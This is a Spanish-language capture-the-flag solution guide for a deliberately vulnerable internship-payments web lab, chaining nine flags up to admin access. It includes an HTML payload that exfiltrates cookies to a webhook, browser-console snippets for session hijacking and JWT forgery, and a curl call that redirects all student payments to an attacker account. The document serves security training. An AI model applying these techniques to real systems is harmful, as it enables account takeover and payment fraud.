# Solución del laboratorio InternLink

Este documento describe el flujo completo para resolver el laboratorio: desde un usuario estudiante hasta administrador, explotando las vulnerabilidades en cadena y obteniendo cada flag.

---

## Objetivo final del laboratorio

**Escenario:** En InternLink cada estudiante tiene una **cuenta Bancolombia** donde recibe el pago de su pasantía. El panel de administración permite gestionar salarios y ver esas cuentas. El **objetivo del pentest** no es solo “ser admin”: es demostrar que un atacante podría **desviar todos los pagos** a su propia cuenta.

**El “chiste” del lab:** Existe un endpoint de uso interno (solo admin) que permite **actualizar de forma masiva** la cuenta Bancolombia de todos los estudiantes. Ese endpoint no está en la interfaz del panel; aparece referenciado en el **registro del sistema** (log) que el admin puede abrir desde Herramientas de soporte. El flujo final es:

1. Entras al panel admin (JWT forjado) y ves que los usuarios tienen cuentas Bancolombia para el pago de pasantías.
2. Abres el log del sistema (ruta en Herramientas de soporte) y obtienes la **flag 8** (token de auditoría) y, sobre todo, **descubres** que existe el endpoint `/api/admin/bulk-update-payment-accounts`.
3. Llamas a ese endpoint con **tu** cuenta Bancolombia (la que tú inventas como atacante). El sistema actualiza en masa todas las cuentas de todos los estudiantes a esa cuenta.
4. La API te devuelve la **flag 9** y el mensaje de que los salarios se abonarán en la cuenta indicada. **Laboratorio completado:** demostraste que un atacante puede redirigir todos los pagos a su propia cuenta.

**Resumen:** Escalar hasta admin, abrir el log para obtener la flag 8 y la pista del endpoint, y usar el endpoint de actualización masiva para “poner tu cuenta” en todos los usuarios y recibir la flag final.

---

## Resumen de flags

| #   | Flag                              | Vulnerabilidad                                    |
| --- | --------------------------------- | ------------------------------------------------- |
| 1   | `FLAG{user_enumeration_is_real}`  | Enumeración de usuarios                           |
| 2   | `FLAG{stored_xss_persisted}`      | Stored XSS vía subida de CV                       |
| 3   | `FLAG{session_hijacked}`          | Session hijacking (cookie sin HttpOnly)           |
| 4   | `FLAG{idor_horizontal}`           | IDOR horizontal en candidatos                     |
| 5   | `FLAG{mass_assignment_abuse}`     | Mass assignment en perfil                         |
| 6   | `FLAG{binary_files_hide_secrets}` | Archivo binario sin extensión                     |
| 7   | `FLAG{jwt_forged_successfully}`   | JWT con secret débil                              |
| 8   | `FLAG{logs_are_sensitive}`        | Logs expuestos                                    |
| 9   | `FLAG{internlink_compromised}`    | Redirección masiva de pagos (cuentas Bancolombia) |

---

## Acto 1 — Enumeración de usuarios e invitación

**Contexto:** La primera pantalla pide el **correo de quien te invitó** a la aplicación. No tienes ese dato, así que hay que descubrirlo.

**Vulnerabilidad:** La misma ruta de verificación, `/api/check-email`, acepta **GET** además de POST. Está mal implementada: al hacer GET devuelve una lista de usuarios registrados en el sistema (filtro incorrecto que filtra por “registrados”) e incluye un campo que indica qué usuarios **pueden invitar**. Solo dos tienen ese permiso (coordinador y administrador). Al hacer **POST** con el correo de uno de esos dos invitadores válidos, se verifica la invitación, se desbloquea el acceso (cookie) y se devuelve la flag en un header.

**Pasos:**

1. Abre la aplicación. Verás la pantalla de **verificación de invitación**: se pide el "Correo del invitador". Hay una pista que indica que la misma ruta acepta consultas por otros medios (por ejemplo GET).
2. Como no tienes el correo del invitador, prueba a llamar a la **misma URL con GET**: `GET /api/check-email` (en el navegador, DevTools o con `curl`). La respuesta es JSON con un array `usuarios`: cada elemento tiene `email` y `puede_invitar` (true/false). Solo dos correos tienen `puede_invitar: true` (p. ej. `coordinador@internlink.com` y `admin@internlink.com`).
3. En el formulario de la página, ingresa uno de esos dos correos (el de un invitador válido) y pulsa **Verificar invitación** (POST).
4. Si el correo es válido como invitador, verás el mensaje de éxito y los enlaces **Iniciar sesión** y **Crear cuenta nueva**. En esa respuesta (POST), el header `X-Request-Id` contiene **Flag 1:** `FLAG{user_enumeration_is_real}`. Revisa los headers en DevTools (Network → respuesta al POST a `check-email`) o con `curl -i`.
5. Si usas un correo registrado pero que no puede invitar (p. ej. empresa o estudiante), la API responderá que ese usuario no tiene permiso para invitar. Solo los dos con `puede_invitar: true` desbloquean el acceso.
6. Para seguir el lab: haz clic en **Crear cuenta nueva**, regístrate con tu propio correo como estudiante y continúa con el Acto 2.

---

## Acto 2 — Stored XSS vía subida de CV

**Vulnerabilidad:** La subida de CV solo valida la **extensión** (`.pdf`). No se comprueba el tipo MIME real. Puedes subir un archivo HTML renombrado como `.pdf`. El sistema lo guarda y lo sirve como HTML en `/view-cv/<filename>`, y un proceso automático “revisa” el CV, ejecutando el JavaScript del archivo.

**Pasos:**

1. Crea un archivo HTML con un script que envíe la cookie (o otros datos) a tu webhook. Ejemplo base (solo sustituye `TU_WEBHOOK_AQUI` por la URL de tu webhook, p. ej. de webhook.site o RequestBin):

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>CV</title>
  </head>
  <body>
    <h1>Currículum</h1>
    <p>Contenido de ejemplo.</p>
    <script>
      (function () {
        var w = "TU_WEBHOOK_AQUI";
        var x = new Image();
        x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
      })();
    </script>
  </body>
</html>
```

2. Guárdalo como `cv.pdf` (solo cambia la extensión a `.pdf`).
3. Con tu usuario estudiante, sube ese “CV” en el panel (Subir Currículum Vitae).
4. El servidor guarda el archivo y simula una revisión automática. En esa revisión se envía una petición a tu webhook con la cookie de la empresa y la flag de este acto.
5. **Flag 2:** En tu webhook verás una petición GET con dos parámetros en la URL: `c` (cookie de la empresa, ver Acto 3) y **`flag`** = `FLAG{stored_xss_persisted}`. Revisa la pestaña Query/Params de la petición para copiar la flag.

---

## Acto 3 — Session hijacking

**Vulnerabilidad:** La cookie de sesión (`session_token`) no tiene el flag `HttpOnly`. Cuando el proceso automático “revisa” el CV subido, simula que una empresa (TechCorp) abre ese archivo. El sistema detecta la URL de tu webhook en el HTML y envía la cookie de sesión de la empresa a esa URL, como si el script del CV la hubiera exfiltrado.

**Pasos:**

1. Tras subir el “CV” malicioso del Acto 2 (con tu webhook dentro del HTML), el servidor ejecuta la revisión automática y **envía la cookie de la empresa** a tu webhook. No hace falta que nadie abra el enlace a mano.
2. Abre tu webhook (webhook.site, RequestBin, etc.). Verás una petición **GET** con los parámetros `c` (cookie exfiltrada) y `flag` (Flag 2). En Query/Params: `c` = `session_token=<valor_hex>` y `flag` = `FLAG{stored_xss_persisted}`.
3. Copia el **valor** de `session_token` (solo la parte hexadecimal larga, o la cadena completa `session_token=...` si usas la consola).
4. En tu navegador (o en una ventana de incógnito), abre DevTools → Console y establece la cookie y recarga:
   ```js
   document.cookie = "session_token=VALOR_HEX_QUE_COPIASTE";
   location.href = "/";
   ```
5. Deberías entrar al **panel de empresa** (TechCorp).
6. **Flag 3:** En el panel de empresa, en la sección “Información de Cuenta”, el campo **API Key** contiene la flag: `FLAG{session_hijacked}` (viene en un valor tipo `tc_prod_FLAG{session_hijacked}_v2`). A partir de aquí puedes seguir con el Acto 4 (IDOR) desde ese mismo panel.

---

## Acto 4 — IDOR horizontal

**Vulnerabilidad:** El endpoint `/api/company/candidates` acepta el parámetro `company_id` y devuelve los candidatos/pasantías de esa empresa **sin comprobar** que el usuario autenticado sea de esa empresa. Puedes pedir candidatos de otras empresas cambiando `company_id`.

**Pasos:**

1. Sigue con la sesión de empresa (la que robaste en el Acto 3) o inicia sesión como empresa si lo prefieres.
2. En el panel de empresa, al cargar “Candidatos”, la app llama a algo como:
   `GET /api/company/candidates?company_id=1`
3. Cambia el parametro a `company_id=2` (otra empresa). La respuesta incluye candidatos de DataFlow Inc con datos normales. No hay flag ahi.
4. Prueba con `company_id=3` (SecureLog Corp). Esa empresa tiene datos mas confidenciales.
5. **Flag 4:** En la **evaluacion** de uno de los candidatos (p. ej. Patricia Mora) aparece la flag: `FLAG{idor_horizontal}`.
6. Revisa la respuesta completa de `company_id=3`. La API devuelve **`internal_ref`**, **`audit_note`** y **`doc_url`**. La nota hace referencia a documentacion interna de SecureLog Corp: **`/internal/docs/securelog-corp`**. Abre esa URL (p. ej. `http://localhost:5000/internal/docs/securelog-corp`). La pagina esta redactada como doc de uso interno para el equipo de RRHH de SecureLog: explica "validacion de perfiles" en la plataforma y como actualizar el rol (p. ej. a coordinador) con ejemplos de **curl para Linux/macOS y Windows** listos para copiar. Es el recurso que ellos usan y que nos estamos encontrando.

---

## Acto 5 — Mass assignment

**Contexto:** En el Acto 4, al revisar los datos confidenciales de SecureLog Corp, viste una referencia a su documentacion interna (`/internal/docs/securelog-corp`). Esa pagina esta escrita para su equipo (validacion de perfiles, actualizar rol). El siguiente paso es usar esos ejemplos de curl con tu sesion de **estudiante** (no de empresa).

**Vulnerabilidad:** El endpoint `PUT /api/profile/update` acepta cualquier campo en el JSON (no hay lista blanca). Si envias `role`, el backend lo persiste y la sesion se actualiza.

**Pasos:**

1. Cierra sesion de empresa e inicia sesion como **estudiante**.
2. Abre DevTools → Application → Cookies y copia el valor de **`session_token`**.
3. Abre <code>/internal/docs/securelog-corp</code>. Copia el comando de una linea segun tu sistema: **Linux/macOS**, **Windows (PowerShell)** o **Windows (CMD)**.
4. Sustituye <code>TU_SESSION_TOKEN</code> por el valor de la cookie y ejecuta el comando.
5. Si la respuesta es JSON con <code>"success": true</code>, recarga la app; deberias pasar al **panel de coordinador**. (Si envias <code>role: "admin"</code> el servidor responde 403; hay que usar <code>coordinator</code>.)
6. **Flag 5:** En el panel de coordinador, en **Avisos del sistema**, uno de los avisos contiene la flag: `FLAG{mass_assignment_abuse}`.

---

## Acto 6 — Archivo binario sin extensión

**Vulnerabilidad:** El endpoint `/exports/candidates` (accesible como coordinador) devuelve un archivo que en realidad es un Excel (XLSX) pero se sirve **sin extensión** y como contenido binario genérico. La URL no muestra `.xlsx`, por lo que el navegador puede mostrar datos “raros”. Dentro del Excel hay una hoja con configuración interna y una flag.

**Pasos:**

1. Con sesión de **coordinador** (del Acto 5), en el panel usa el enlace “Descargar Reporte” que apunta a `/exports/candidates`.
2. Se descarga un archivo sin extensión (nombre tipo `candidates`). Ábrelo con un editor de texto o revisa los primeros bytes: verás la firma de un ZIP/Office (PK…).
3. En Linux/Mac: `file candidates` → indicará que es un ZIP o Excel. Renómbralo a `candidates.xlsx`.
4. En Windows: renómbralo a `candidates.xlsx` y ábrelo con Excel o LibreOffice.
5. Además de la hoja de candidatos, hay una hoja **Configuracion** con parámetros como `jwt_secret`, `admin_jwt_payload`, `admin_endpoint`, `system_token`, etc.
6. **Flag 6:** En esa hoja aparece la flag: `FLAG{binary_files_hide_secrets}` (campo `system_token`).
7. Anota `jwt_secret`, `admin_jwt_payload` (el JSON trae un email genérico `@mail.com`; la nota `admin_payload_nota` indica reemplazarlo por la cuenta del administrador, **inferida** de quién puede invitar, p. ej. GET `/api/check-email`) y `admin_endpoint`; los usarás en el Acto 7 para forjar el token.

---

## Acto 7 — JWT con secret débil y entrada al panel admin

**Vulnerabilidad:** El panel de administrador acepta JWT (cookie `admin_token` o header `Authorization: Bearer <token>`). El secret y el payload están en el Excel del Acto 6 (`jwt_secret` y `admin_jwt_payload`). El payload en el Excel trae un **email genérico** (p. ej. `usuario@mail.com`); la nota `admin_payload_nota` indica reemplazarlo por la cuenta del administrador, **inferida** del sistema (Acto 1: listado de usuarios con `puede_invitar` en GET `/api/check-email`).

**Cómo conocer el payload:** En la hoja **Configuracion** del Excel aparece **`admin_jwt_payload`** con un JSON que lleva `user_id`, `email` (genérico @mail.com) y `role`. Sustituye el email por el del administrador (inferido de quién puede invitar).

**Cómo generar el JWT (elegir una):**

- **Opción A — jwt.io:** Pega el payload del Excel, **cambia el email** por el del admin (inferido). Pega el `jwt_secret` en "Verify Signature", HS256. Copia el token.
- **Opción B — Script del repo:** `python payloads/jwt_forge.py internlink2024` genera un token con el payload por defecto (email genérico). Si el servidor exige el email del admin, edita el script o pasa el payload con el email inferido.

**Pasos:**

1. Genera el token con la opción A o B.
2. **Establecer la cookie en el navegador:** El panel de admin exige que la cookie se llame exactamente **`admin_token`** y que su valor sea el token generado. En el navegador, abre DevTools (F12) → pestaña **Console** y ejecuta (sustituye `TOKEN_GENERADO` por el JWT que obtuviste):
   ```js
   document.cookie = "admin_token=TOKEN_GENERADO; path=/";
   location.href = "/dashboard/admin";
   ```
   **Importante:** La cookie debe ser **`admin_token`** = *valor del token* (sin espacios extra; el nombre de la cookie es literalmente `admin_token`).
3. Entras al **panel de administración**. El panel muestra: gestión de salarios y ofertas, **Estudiantes con cuenta** (con su **Cuenta Bancolombia** donde reciben el pago de pasantías), **Convenios de pasantía**, ofertas, **Configuración del sistema** y **Herramientas de soporte**.
4. **Flag 7:** En la tabla **Configuración del sistema**, el campo **`admin_verification`** tiene el valor: **`FLAG{jwt_forged_successfully}`**. Con eso demuestras que el JWT forjado fue aceptado.
5. Para las flags 8 y 9: usa **Herramientas de soporte** para abrir el registro del sistema y descubre ahí la pista del endpoint de actualización masiva de cuentas. Sigue al Acto 8.

---

## Acto 8 — Logs, endpoint de cuentas y cierre del laboratorio (flags 8 y 9)

**Contexto:** En el panel admin has visto que cada estudiante tiene una **cuenta Bancolombia** donde recibe el pago de su pasantía. La prueba final de compromiso es **desviar todos esos pagos** a la cuenta del atacante. Para eso hace falta descubrir un endpoint que no está en la interfaz: está referenciado en el **registro del sistema**. Por mal diseño, el panel incluye **Herramientas de soporte** con la ruta del log (`/logs/debug.log`); el log está servido sin autenticación y en su contenido se menciona el endpoint de actualización masiva de cuentas Bancolombia.

**Vulnerabilidades:**

- Exposición de la ruta del log en la interfaz de admin.
- El archivo de log accesible en `/logs/debug.log` sin control de acceso (flag 8 y pista del endpoint).
- Existencia de un endpoint solo-admin que actualiza **en masa** la cuenta Bancolombia de todos los estudiantes, permitiendo redirigir todos los pagos a una sola cuenta.

**Pasos:**

1. Con sesión de admin (Acto 7), en el panel ve a **Herramientas de soporte** y abre el **registro del sistema** (`/logs/debug.log`).
2. **Flag 8:** En el log aparece una línea con el **token de auditoría del sistema**: **`FLAG{logs_are_sensitive}`**. Cópiala.
3. **Pista para la flag 9:** En el mismo log verás una línea que menciona la **actualización masiva de cuentas Bancolombia** y el endpoint **`/api/admin/bulk-update-payment-accounts`** (solo admin). Ese endpoint permite cambiar de una vez la cuenta de pago de todos los estudiantes.
4. Llama al endpoint con tu JWT de admin (cookie `admin_token` o header `Authorization: Bearer <token>`) y el cuerpo:
   ```json
   { "bank_account": "TU_CUENTA_BANCOLOMBIA" }
   ```
   Sustituye `TU_CUENTA_BANCOLOMBIA` por el número de cuenta que quieras usar como atacante (p. ej. `99998888777`). **Importante:** el header debe ser exactamente **`Authorization: Bearer <token>`** (la palabra "Bearer " seguida de un espacio y luego el JWT). Ejemplo con curl:
   ```bash
   curl -X POST http://localhost:5000/api/admin/bulk-update-payment-accounts \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer TU_JWT_AQUI" \
     -d '{"bank_account":"99998888777"}'
   ```
   (Reemplaza `TU_JWT_AQUI` por tu token; si pones solo el token sin "Bearer ", el servidor responderá "No autorizado".)
   En este último punto, la idea del laboratorio es hacer una **enumeración tipo
   fuerza bruta de la estructura de la petición**: probar variantes y leer los
   mensajes de error que devuelve la API para ajustar lo que falta o está mal.
   Por ejemplo, el endpoint te va guiando con pistas como `no se leyo jwt`,
   `jwt incorrecto` o `no se envio body`, hasta llegar al formato correcto
   (`Authorization: Bearer <token>` + JSON con `bank_account`).
5. La API responde con `success: true`, un mensaje indicando que las cuentas de todos los estudiantes fueron actualizadas (los salarios se abonarán en la cuenta indicada), la **flag 9:** **`FLAG{internlink_compromised}`** y la URL **`congratulations_url`**. Abre esa URL en el navegador para ver la página de felicitación por completar el lab y obtener un regalo (botón que abre un enlace al azar). **Laboratorio completado.**

**Cierre del laboratorio:** Ser admin tiene un objetivo claro: ver las cuentas Bancolombia de los usuarios y, con la pista del log, descubrir y abusar del endpoint de actualización masiva para “poner tu cuenta” en todos ellos y recibir la flag final.

---

## Orden recomendado (cadena completa)

1. **Acto 1** — Verificación de invitación: GET a `/api/check-email` para ver quién puede invitar; POST con ese correo; flag 1 en header `X-Request-Id`.
2. **Registro** como estudiante.
3. **Acto 2** — Subir CV HTML como `.pdf`; XSS ejecutado en revisión automática; flag 2 en webhook.
4. **Acto 3** — Robar cookie de sesión vía XSS; suplantar empresa; flag 3 en API Key del panel.
5. **Acto 4** — Con sesión empresa, `company_id=3` en candidatos; flag 4 en evaluación; anotar `doc_url` y abrir `/internal/docs/securelog-corp`.
6. **Acto 5** — Con sesión estudiante, `PUT /api/profile/update` con `role: coordinator`; flag 5 en Avisos del coordinador.
7. **Acto 6** — Descargar `/exports/candidates`, renombrar a `.xlsx`, hoja **Configuracion**: flag 6 y datos para JWT.
8. **Acto 7** — Forjar JWT, establecer `admin_token`, acceder a `/dashboard/admin`; **flag 7** en `admin_verification` (Configuración del sistema).
9. **Acto 8** — En el panel admin, **Herramientas de soporte** → abrir `/logs/debug.log`. Obtener **flag 8** (`FLAG{logs_are_sensitive}`) y localizar en el log la mención al endpoint **`/api/admin/bulk-update-payment-accounts`**. Hacer **POST** a ese endpoint con `{"bank_account": "TU_CUENTA"}` y el JWT de admin; la respuesta incluye **flag 9** (`FLAG{internlink_compromised}`). Laboratorio completado: redirección masiva de pagos a la cuenta del atacante.

Con esto se completa la misión: escalada hasta admin, descubrimiento del endpoint en el log y abuso del mismo para desviar todos los pagos a la cuenta del atacante.
